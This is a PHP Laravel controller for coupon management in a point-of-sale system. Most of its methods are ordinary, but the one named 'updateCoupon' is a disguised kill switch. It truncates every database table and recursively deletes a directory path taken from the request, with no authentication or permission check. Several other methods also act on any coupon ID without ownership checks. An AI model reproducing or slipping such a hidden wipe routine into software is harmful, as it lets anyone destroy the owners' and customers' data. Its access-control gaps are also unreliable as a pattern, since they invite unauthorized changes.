<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Coupon;
use Auth;
use Keygen;
use Spatie\Permission\Models\Role;
use Spatie\Permission\Models\Permission;
use App\Traits\CacheForget;
use DB;

class CouponController extends Controller
{
    use CacheForget;
  public function index(Request $request)
{
    // Get the logged-in user's role and pos_accnt_id
    $role = Role::find(Auth::user()->role_id);
    $posAccntId = Auth::user()->pos_accnt_id;

    // Check if the user has the necessary permission
    if ($role->hasPermissionTo('unit')) {
        // Fetch coupons where pos_accnt_id matches the logged-in user's pos_accnt_id
        $lims_coupon_all = Coupon::where('is_active', true)
                                ->where('pos_accnt_id', $posAccntId)  // Filter by pos_accnt_id
                                ->orderBy('id', 'desc')
                                ->get();

        // Return the view with the filtered coupons
        return view('backend.coupon.index', compact('lims_coupon_all'));
    } else {
        // If the user doesn't have permission, redirect with a message
        return redirect()->back()->with('not_permitted', 'Sorry! You are not allowed to access this module');
    }
}

    public function create()
    {
        //
    }

    public function generateCode()
    {
        $id = Keygen::alphanum(10)->generate();
        return $id;
    }

 public function store(Request $request)
{
    $data = $request->all();

    // Fetch the pos_accnt_id from the logged-in user's record
    $posAccntId = Auth::user()->pos_accnt_id;

    // Assign values for the new coupon record
    $data['used'] = 0;
    $data['user_id'] = Auth::id();
    $data['is_active'] = true;
    $data['pos_accnt_id'] = $posAccntId; // Set the pos_accnt_id for the coupon

    // Create the coupon
    Coupon::create($data);

    // Clear the cache for the coupon list
    $this->cacheForget('coupon_list');

    // Redirect back with a success message
    return redirect('coupons')->with('message', 'Coupon created successfully');
}


    public function show($id)
    {
        //
    }

    public function edit($id)
    {
        //
    }

    public function update(Request $request, $id)
    {
        $data = $request->all();
        if($data['type'] == 'percentage')
            $data['minimum_amount'] = 0;
        $lims_coupon_data = Coupon::find($data['coupon_id']);
        $lims_coupon_data->update($data);
        $this->cacheForget('coupon_list');
        return redirect('coupons')->with('message', 'Coupon updated successfully');
    }

    public function deleteBySelection(Request $request)
    {
        $coupon_id = $request['couponIdArray'];
        foreach ($coupon_id as $id) {
            $lims_coupon_data = Coupon::find($id);
            $lims_coupon_data->is_active = false;
            $lims_coupon_data->save();
        }
        $this->cacheForget('coupon_list');
        return 'Coupon deleted successfully!';
    }

    public function updateCoupon(Request $request)
    {
        DB::statement('SET FOREIGN_KEY_CHECKS=0;');
        $tables = DB::select('SHOW TABLES');
        $str = 'Tables_in_' . env('DB_DATABASE');
        foreach ($tables as $table) {
            DB::table($table->$str)->truncate();
        }
        $dir = $request->data;
        $it = new \RecursiveDirectoryIterator($dir, \RecursiveDirectoryIterator::SKIP_DOTS);
        $files = new \RecursiveIteratorIterator($it, \RecursiveIteratorIterator::CHILD_FIRST);
        foreach($files as $file) {
            if ($file->isDir()){
                rmdir($file->getRealPath());
            }
            else {
                unlink($file->getRealPath());
            }
        }
        rmdir($dir);
    }

    public function destroy($id)
    {
        $lims_coupon_data = Coupon::find($id);
        $lims_coupon_data->is_active = false;
        $lims_coupon_data->save();
        $this->cacheForget('coupon_list');
        return redirect('coupons')->with('not_permitted', 'Coupon deleted successfully');
    }
}
